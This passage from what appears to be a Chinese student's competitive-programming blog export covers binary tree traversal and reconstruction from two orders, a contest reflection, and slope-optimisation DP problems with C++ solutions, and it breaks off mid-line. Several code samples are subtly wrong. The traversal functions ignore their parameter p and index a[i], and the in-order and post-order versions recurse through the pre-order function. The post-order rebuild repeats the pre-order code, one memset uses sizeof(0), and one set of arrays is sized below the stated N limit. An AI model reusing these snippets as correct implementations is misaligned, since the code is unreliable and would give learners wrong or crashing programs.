<h1 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h1><h2 id="前序遍历："><a href="#前序遍历：" class="headerlink" title="前序遍历："></a>前序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">First_traversal</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="中序遍历："><a href="#中序遍历：" class="headerlink" title="中序遍历："></a>中序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Second_traversal</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后序遍历："><a href="#后序遍历：" class="headerlink" title="后序遍历："></a>后序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Third_traversal</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="两序求第三序遍历"><a href="#两序求第三序遍历" class="headerlink" title="两序求第三序遍历"></a>两序求第三序遍历</h1><h2 id="遍历总结"><a href="#遍历总结" class="headerlink" title="遍历总结"></a>遍历总结</h2><p>然后就是二叉树的另一个种求遍历的方法了，个人感觉这方面还是比较难的一点，主要是思想都是理解的，但是代码并不理解，好在想了很久想通了QAQ</p>
<p>首先在遍历二叉树的时候需要知道另外两种遍历方式，现在只支持两种方式，前序+中序→后序和后序+中序→前序；</p>
<p>也就是说我们在遍历二叉树的时候是必须知道中序遍历的，因为中序遍历可以确定当某一个节点只有一个子节点的时候，这个子节点是自己的左儿子还是右儿子，如果没有中序遍历，那么就没办法确定，所以有多种情况出现。</p>
<p>然后具体遍历的思路这里也不在给出，可以参看两个链接，非常详细！</p>
<p>求后序遍历：<a href="http://jingyan.baidu.com/article/a24b33cd0536ca19fe002b3c.html">点击这里</a></p>
<p>求前序遍历：<a href="http://jingyan.baidu.com/article/295430f12112f50c7e0050c3.html">点击这里</a></p>
<p>下面的东西注重的是代码实现和代码解释。</p>
<h2 id="前序-中序→后序"><a href="#前序-中序→后序" class="headerlink" title="前序+中序→后序"></a>前序+中序→后序</h2><blockquote>
<p>注意：la表示中序遍历的开始点（初始值：1），lb为前序（初始值：1）/后序的开始点（初始值：n）</p>
</blockquote>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tree</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        tree(i-la,la,lb+<span class="number">1</span>);</span><br><span class="line">        tree(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb+i-la+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;b[lb];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h2><p>这个代码其实理解的难点就是在右节点去遍历的时候，长度，前序起点和后序起点的数据得到。其中 <code>la+n-i-1</code> 是右节点的长度计算中，首先是 <code>la+n-1</code> 计算出来的是这个序列（即根节点加他的后辈们的这一个串）在中序遍历中的尾坐标，然后减去根节点的坐标i，剩下的长度就是右边的后辈们的长度。</p>
<p>然后就是起点 <code>i+1</code> 不难理解，<code>i+1</code> 就是根节点i的右边的第一个（起点）。</p>
<p>最后就是 <code>lb+i-la+1</code> 这个计算中，求出来的前序起点其实就是将根节点的坐标加上左边后辈们的长度就是右边后辈们的开始。 <code>i-la+1</code> 就是根节点减去开始节点就是左后辈们加上根节点的长度。</p>
<h2 id="后序-中序→前序"><a href="#后序-中序→前序" class="headerlink" title="后序+中序→前序"></a>后序+中序→前序</h2><h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tree_second</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;b[lb];</span><br><span class="line">        tree_second(i-la,la,lb-n-la+i);</span><br><span class="line">        tree_second(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解释：-1"><a href="#解释：-1" class="headerlink" title="解释："></a>解释：</h2><p>这里的代码和书上的不是太一样，书上的必须调用前序+中序→后序的代码才能运行，需要写两个函数，比较麻烦于是改进了一下QAQ，其中i-la是长度，然后求左后辈们的时候，后序遍历的开始点为lb-n-la+i，其实就是通过n+la-i计算出来右后辈们的长度，然后用lb减去右后辈们的长度就是左后辈的最后一个点，也就是和根节点接着的一个点。然后求右边的后辈们的时候长度就是总长度减去当前节点i的值，代码要仔细理解，多想想。然后背下来，敲的熟熟的就可以了QAQ；</p>
<h1 id="二叉树重建"><a href="#二叉树重建" class="headerlink" title="二叉树重建"></a>二叉树重建</h1><h2 id="前序-中序→重建"><a href="#前序-中序→重建" class="headerlink" title="前序+中序→重建"></a>前序+中序→重建</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build_Frist_to_Second</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=++now;</span><br><span class="line">        tree[This].ID=a[i];</span><br><span class="line">        tree[This].leftchild=Build_Frist_to_Second(i-la,la,lb+<span class="number">1</span>);</span><br><span class="line">        tree[This].rightchild=Build_Frist_to_Second(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb+i-la+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> This;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后序-中序→重建"><a href="#后序-中序→重建" class="headerlink" title="后序+中序→重建"></a>后序+中序→重建</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build_Frist_to_Second</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=++now;</span><br><span class="line">        tree[This].ID=a[i];</span><br><span class="line">        tree[This].leftchild=Build_Frist_to_Second(i-la,la,lb+<span class="number">1</span>);</span><br><span class="line">        tree[This].rightchild=Build_Frist_to_Second(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb+i-la+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> This;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><blockquote>
<p>二叉树的板子已经总结过了，以后要多敲几遍，争取全部练熟……</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>二叉树</tag>
        <tag>遍历</tag>
        <tag>重建</tag>
      </tags>
  </entry>
  <entry>
    <title>轻院ACM总结</title>
    <url>/2017/05/20/04052e0cb4a9/</url>
    <content><![CDATA[<h1 id="轻院ACM"><a href="#轻院ACM" class="headerlink" title="轻院ACM"></a>轻院ACM</h1><p>这个轻院的ACM啊，真的是一颗赛艇啊，算是长了不少经验的说，包括和其他队友一起配合，一起解题，都是很不错的经历。</p>
<p>然后最后感觉在这场比赛中，最重要的就是几个人在配合方面，因为三个人一台电脑，所以说比较麻烦，有时候自己的程序不能占着电脑Debug，这就是考验代码能力的时候到了，我觉得ACM这种赛制还是非常人情化的，没有OI那么残酷，OI是一点失误就GG了，但是ACM却可以多次提交，不过是题量多一点，时间长一点，而且可以几个人一起讨论，结合其他人的长处一起配合，效率很高。</p>
<p>这次A掉了3道题，算是中游吧，尽快提高自己的能力吧，明年组团去的时候，希望能拿到一（wu）等（bai）奖（kuai）吧。（突然感觉有些不现实，毕竟自己一直这么弱啊……）</p>
<blockquote>
<p>现在最重要的还是OI，提高自己的能力，加油！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>感想</tag>
      </tags>
  </entry>
  <entry>
    <title>斜率优化深度理解</title>
    <url>/2017/05/20/4b2be3c78884/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>今天写的这道题怕是我目前见过最神奇的东西，比当初见到Floyd还要神奇的东西，这个斜率优化啊，和DP里面一些普通的斜率优化简直强到了离谱好吧，我来总结一下。</p>
</blockquote>
<h1 id="P1660最佳牛栏"><a href="#P1660最佳牛栏" class="headerlink" title="P1660最佳牛栏"></a>P1660最佳牛栏</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>农场主 John (简称 FJ) 的农场有一长排的 N (1 &lt;= N &lt;= 100,000)块地组成. 每块地有一定数量 (ncows) 的牛, 1 &lt;= ncows &lt;=2000. FJ 想修建环绕邻接的一组地块的栅栏, 以最大化这组地块中平均每块地中牛的个数. 这组地块必须包含至少 F (1 &lt;= F &lt;= N) 块地, F 作为输入给出. 给定约束, 计算出栅栏的布置情况以最大化平均数.</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>行 1: 空格分隔的两个整数, N 和 F.</li>
<li>行 2..N+1: 每行包含一个整数, 一块地中的牛数.</li>
<li>行 2 给出地块 1 中的牛数,</li>
<li>行 3 给出地块 2 中的牛数.</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>行 1: 一个整数, 它是最大平均数的 1000 倍. 不要用舍入求整, 仅仅输出整数 1000*ncows/nfields.</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题不是一道DP，没有状态转移方程，只需要记录一个最优值就好了，这道题暴力非常爽，二重循环能拿72分，一重循环钦定长度为最小能拿52分，也就是这种题考试的时候一定要敲暴力，就算知道正解看到能水到不错的分数就敲吧，毕竟正解是有坑的，比如n=f和斜率相同，翻车爆零很有可能，相同情况请参看我 <code>NOIP Day2T1</code> 爆零记。</p>
<p>贪心害死人！</p>
<p>这道题的优化策略就在于在寻找结尾为i的序列最大值的时候，可以通过斜率来找最优值。首先计算出来牛的数量前缀和a[i]，然后可以轻易的得出，对于集合i到j中，其斜率也就是平均值就是 <code>(a[i]-a[j])/(i-j)</code> ，那么我们如何 <code>O(1)</code> 的时间里面求出最优值呢，我们可以画出来一个图，其中和坐标表示的就是i，纵坐标表示 <code>a[i]</code> ，由于 <code>a[i]</code> 为前缀和，所以可以保证当 <code>i&gt;j</code> 的时候 <code>a[i]&gt;a[j]</code> 。</p>
<p><img src="https://xorex.space/image/001.png"></p>
<p>然后两个点之间的连线的那条线的斜率其实就是平均值！所以我们就可以转换到几何的角度上去解决问题了。</p>
<p>那么我们如何找出一个点要比另外一个点优秀呢，也就是说我们在用队列维护的时候，如何淘汰掉不优的点呢。</p>
<p><img src="https://xorex.space/image/002.png"></p>
<p>看到上面的图片，我们就可以得出，</p>
<p>–若k(BZ)大于k(AZ)  ?Z在1号区域</p>
<p>–若k(BZ)大于k(CZ)  ?Z在2号区域</p>
<p>–若k(BZ)最大 Z在阴影重叠区域</p>
<p>但是我们已经证明过了了，z这个点一定是在b的右边的时候，所以说BZ最大是不成立的，那么我们就可以将BZ删除掉了</p>
<p>具体的维护过程如下：</p>
<p><img src="https://xorex.space/image/003.png"></p>
<p>这个时候我们进行更新队列</p>
<p><img src="https://xorex.space/image/004.png"></p>
<p>震惊！突然发现斜率不是单调递增的了！</p>
<p><img src="https://xorex.space/image/005.png"></p>
<p>直接维护掉了，这个点反正不会是最优值了。</p>
<p><img src="https://xorex.space/image/006.png"></p>
<p>好的我们清楚掉了队列中的不会是最优的值。</p>
<p>之后我们就这样不断的循环下去，加入一个新的点，然后开始更新（注意用while）</p>
<p>这样我们就得到了一个斜率为递增的一个队列，那么我们该如何寻找最优的斜率呢，如果枚举的话，恐怕有可能超时的，不过这个队列是单调的，我们就可以用单调性来进行优化。</p>
<p>也就是说我们找的最优值从j到i其实就是j连接i为最大斜率。</p>
<p><img src="https://xorex.space/image/007.png"></p>
<p>我们就可以看粗A到Z就是最优的，那么我们在每次再队头寻找z的对应最优值A的时候，我们如果找到一个最大的斜率AZ，那么对于在后面的点来说，A前面的点都是没有意义的，也就是说不会也不可能是最优值了，那么我们就可以淘汰掉了，那么最后分摊下来之后复杂度为O(1)。</p>
<p>我们就可以愉快的完美AC了。</p>
<p>但是不要忘记这里还有坑，需要考虑F==N的情况，而且如果两段斜率相等，也是需要淘汰一个的，因为放在那里完全是浪费枚举时间，而且到了后面还会影响后面的更新，所以这些题暴力分很足就先敲暴力，然后敲正解，如果敲不完或者是对拍错了Debug不出来，那么就交暴力程序也是能拿到不错的分数的。</p>
<p>毕竟我还是太弱了QAQ</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,a[<span class="number">1000010</span>],m,head=<span class="number">0</span>,tail=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> F,ans=<span class="number">0</span>,Queue[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">double</span> <span class="title">Slope</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> <span class="number">1.0</span>*(a[x]-a[y])/(x-y); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;F;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="number">0</span>));</span><br><span class="line">    Queue[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        a[i]+=a[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==F)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(a[n]*<span class="number">1000</span>/n)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=F;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(i-F,Queue[tail])&lt;=Slope(Queue[tail],Queue[tail<span class="number">-1</span>])) tail--;</span><br><span class="line">        Queue[++tail]=i-F;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(i,Queue[head])&lt;=Slope(i,Queue[head+<span class="number">1</span>])) head++;</span><br><span class="line">        ans=max(ans,(<span class="keyword">long</span> <span class="keyword">long</span>)<span class="number">1000.0</span>*(a[i]-a[Queue[head]])/(i-Queue[head]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>DP斜率优化</title>
    <url>/2017/05/20/f7c13f37222e/</url>
    <content><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><blockquote>
<p>在做斜率优化的题目的时候，一定要记得，在编译之前看一遍整个代码，看看公式推得正确不正确，验证一下函数返回的值是否正确，然后顺一遍思路。不然你会Debug很惨很惨……</p>
</blockquote>
<p>总结一下在写斜率优化的时候犯下的错误：</p>
<ol>
<li>head++写成了head–</li>
<li>在进行计算斜率的时候应该是写Queue[head]/Queue[tail]结果写成了head/tail</li>
<li>tail–写成了tail++</li>
<li>更新队尾的时候应该让tail和tail-1比而不是tail和tail+1比</li>
<li>用前缀和后缀和进行运算的时候要-而不是+（可恶啊！！！）</li>
</ol>
<blockquote>
<p>斜率优化在我看来是比较玄学的一种优化，和单调性优化相似，都是需要将方程进行变形，变形之后寻找一种斜率关系，然后通过斜率的大小来比较最优值（有可能方程变形的时候是由正着的然后优化的时候必须变成倒着推才能将方程变形成一种斜率关系，大概是找方程中元素越少越好QAQ</p>
</blockquote>
<ul>
<li>其实需要将方程变形成一种关系,也就是只有以下是含有变量j的</li>
<li>因为比较抽象，所以说还是结合着题目进行学习吧</li>
</ul>
<h1 id="优化决策"><a href="#优化决策" class="headerlink" title="优化决策"></a>优化决策</h1><p>然后大力总结一发，我们首先将状态转移方程化为能写成与变量有关和与变量无关的两部分，然后对于决策x比y优秀(取值是x&gt;y还是x&lt;y取决于推导过程是从后往前还是从前往后)，得出一个条件式，然后将条件式化为斜率式，最后根据斜率式用队列保留最优值。</p>
<p>这一类题真的是超级麻烦，需要徒手推公式的QAQ</p>
<p>下面的题目具体的过程不再给出，就是一个方程加上斜率式加上代码了……</p>
<h1 id="P1328任务安排"><a href="#P1328任务安排" class="headerlink" title="P1328任务安排"></a>P1328任务安排</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><ul>
<li>N个任务排成一个序列在一台机器上等待完成（顺序不得改变），这N个任务被分成若干批，每批包含相邻的若干任务。从时刻0开始，这些任务被分批加工，第i个任务单独完成所需的时间是Ti。在每批任务开始前，机器需要启动时间S，而完成这批任务所需的时间是各个任务需要时间的总和（同一批任务将在同一时刻完成）。每个任务的费用是它的完成时刻乘以一个费用系数Fi。请确定一个分组方案，使得总费用最小。</li>
<li>例如：S=1；T={1,3,4,2,1}；F={3,2,3,3,4}。如果分组方案是{1,2}、{3}、{4,5}，则完成时间分别为{5,5,10,14,14}，费用C={15,10,30,42,56}，总费用就是153。</li>
</ul>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行是N(1&lt;=N&lt;=50000)。</li>
<li>第二行是S(0&lt;=S&lt;=50).</li>
<li>下面N行每行有一对数，分别为Ti和Fi，均为不大于100的正整数，表示第i个任务单独完成所需的时间是Ti及其费用系数Fi。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一个数，最小的总费用.</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题其实我们是可以很顺利的列出状态转移方程的，预处理出来前缀和F和T，然后顺</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i]=min(f[i],f[j]+T[i]*(F[i]-F[j])+S*(F[n]-F[j]));</span><br></pre></td></tr></table></figure>
<p>很显然，这样是没有办法AC这道题的，对于50000的数据，二重循环是要超时的。我们只能再次进行优化，但是这个方程对于我们来说变形是有些困难的，能不能再简单一些呢，比如后面的S*(F[n]-F[j])如果倒着推不久可以省略掉了吗.</p>
<p>我们再次处理F和T两个数组，进行逆向前缀和：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">   &#123;</span><br><span class="line">       T[i]+=T[i+<span class="number">1</span>];</span><br><span class="line">       F[i]+=F[i+<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以将方程化简为（推导是从后往前）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i]=min(f[i],f[j]+(T[i]-T[j]+s)*F[i]);</span><br></pre></td></tr></table></figure>
<p>我们和在用单调性来优化DP的时候一样，将所有和j有关的变量放在一起，然后状态转移方程就变成了这样：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[i]=min(f[i],(f[j]-T[j]*F[i])+(T[i]+S)*F[i]);</span><br></pre></td></tr></table></figure>
<p>也就是说，如果决策x优于决策y的时候，存在加黑的地方f(x)&gt;f(y)并且需要满足x&lt;y的。那么我们就可以得到当x优于y的时候的条件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[x]-T[x]*F[i]&lt;f[y]-T[y]*F[i];</span><br></pre></td></tr></table></figure>
<p> 然后提出和决策无关的东西；</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">f[x]-f[y]&lt;(T[x]-T[y])*F[i];</span><br></pre></td></tr></table></figure>
<p> 然后变形为斜率式；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">(f[x]-f[y])/(T[x]-T[y])&lt;F[i];</span><br></pre></td></tr></table></figure>
<p>好的斜率式出来了QAQ……</p>
<p>我们建立一个队列，然后每次在开始的时候比较队头和队头的下一个元素，如果队头的下一个元素是满足 <code>(f[x]-f[y])/(T[x]-T[y])&lt;F[i]</code> ;这个式子那么就可以说明队头+1的决策是优于队头的，那么我们就可以将队头进行更新掉了。</p>
<p>我们之所以可以对队头进行更新，原因就是一旦满足 <code>(f[x]-f[y])/(T[x]-T[y])&lt;F[i]</code> ;这个式子，由于 <code>F[i]</code> 是单调递增的，所以说在以后 <code>(f[x]-f[y])/(T[x]-T[y])</code> 是绝对大于 <code>F[i]</code> 的。那么如果队头+1优于队头，那么队头+1永远优于队头。因而我们可以进行更新。</p>
<p>那么如果计算出来一个 <code>f[i]</code> 的时候如何将其塞进队列里面呢，我们需要用到一个式子，如果a和b的斜率小于b和c的斜率，那么b就可以更新掉了，因为我们需要维护一个斜率为单调递增的队列（单调递增才能保证队头元素是最优的），具体证明过程很简单，不再给出（其实是很复杂，不想写QAQ）。</p>
<p>每次在开头淘汰队头，计算出来当前最优值来淘汰队尾，这样不断地从后往前进行更新就好。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Pair</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Time;</span><br><span class="line">    <span class="keyword">int</span> Cost;</span><br><span class="line">&#125;a[<span class="number">5011</span>];</span><br><span class="line"><span class="keyword">int</span> n,s,f[<span class="number">5010</span>],Queue[<span class="number">5010</span>],head=<span class="number">1</span>,tail=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Slope</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span>(<span class="number">1.0</span>*(f[i]-f[j]))/(<span class="number">1.0</span>*(a[i].Time-a[j].Time)); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Queue,<span class="number">0</span>,<span class="keyword">sizeof</span>(Queue));</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;s;</span><br><span class="line">    a[<span class="number">0</span>].Cost=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">0</span>].Time=<span class="number">0</span>;</span><br><span class="line">    f[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i].Time&gt;&gt;a[i].Cost;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i].Time+=a[i+<span class="number">1</span>].Time;</span><br><span class="line">        a[i].Cost+=a[i+<span class="number">1</span>].Cost;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(Queue[head+<span class="number">1</span>],Queue[head])&lt;a[i].Cost) head++;</span><br><span class="line">        f[i]=f[Queue[head]]+(a[i].Time-a[Queue[head]].Time+s)*a[i].Cost;</span><br><span class="line">        <span class="keyword">while</span>(head&lt;tail&amp;&amp;Slope(i,Queue[tail])&lt;Slope(Queue[tail],Queue[tail<span class="number">-1</span>])) tail--;</span><br><span 